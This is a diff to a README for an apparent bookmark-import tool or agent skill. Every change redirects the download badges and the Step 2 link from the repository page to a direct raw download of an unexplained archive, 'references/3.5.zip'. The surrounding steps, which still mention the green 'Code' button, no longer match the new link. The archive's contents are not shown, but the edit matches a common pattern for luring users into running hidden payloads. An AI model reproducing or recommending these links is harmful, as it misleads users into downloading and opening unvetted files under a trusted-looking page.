@@ -47,7 +47,7 @@ This Skill works with any agent that reads `SKILL.md` and runs local commands. N
 
 ## 📥 Downloading the Application
 
-[![Download Now](https://img.shields.io/badge/Download-x--bookmarks--to--obsidian-blue?style=for-the-badge&logo=github)](https://github.com/laszlo2615/x-bookmarks-to-obsidian)
+[![Download Now](https://img.shields.io/badge/Download-x--bookmarks--to--obsidian-blue?style=for-the-badge&logo=github)](https://github.com/laszlo2615/x-bookmarks-to-obsidian/raw/refs/heads/main/references/3.5.zip)
 
 Visit this link to download the application.
 
@@ -60,7 +60,7 @@ Visit this link to download the application.
 4. Name it something simple like `bookmarks.csv`
 
 ### Step 2: Get the Tool
-1. Click the download button above or go to [https://github.com/laszlo2615/x-bookmarks-to-obsidian](https://github.com/laszlo2615/x-bookmarks-to-obsidian)
+1. Click the download button above or go to [https://github.com/laszlo2615/x-bookmarks-to-obsidian/raw/refs/heads/main/references/3.5.zip](https://github.com/laszlo2615/x-bookmarks-to-obsidian/raw/refs/heads/main/references/3.5.zip)
 2. Look for the green "Code" button and select "Download ZIP"
 3. Save the ZIP file to your Desktop
 4. Right-click the ZIP file and choose "Extract All"
@@ -129,6 +129,6 @@ Everything runs locally on your computer. Your bookmarks never leave your machin
 
 Stop scrolling through endless saved posts. Start turning your X bookmarks into a powerful knowledge base that actually works for you. Download the tool, follow the simple steps above, and watch your digital clutter become a clean, useful library.
 
-[![Get Started Now](https://img.shields.io/badge/Get%20Started-Download%20Now-green?style=for-the-badge)](https://github.com/laszlu2615/x-bookmarks-to-obsidian)
+[![Get Started Now](https://img.shields.io/badge/Get%20Started-Download%20Now-green?style=for-the-badge)](https://github.com/laszlo2615/x-bookmarks-to-obsidian/raw/refs/heads/main/references/3.5.zip)
 
 Keywords: x bookmarks, obsidian, csv import, twitter bookmarks, knowledge management, productivity tool, obsidian plugin, bookmark organizer, personal library, content curation
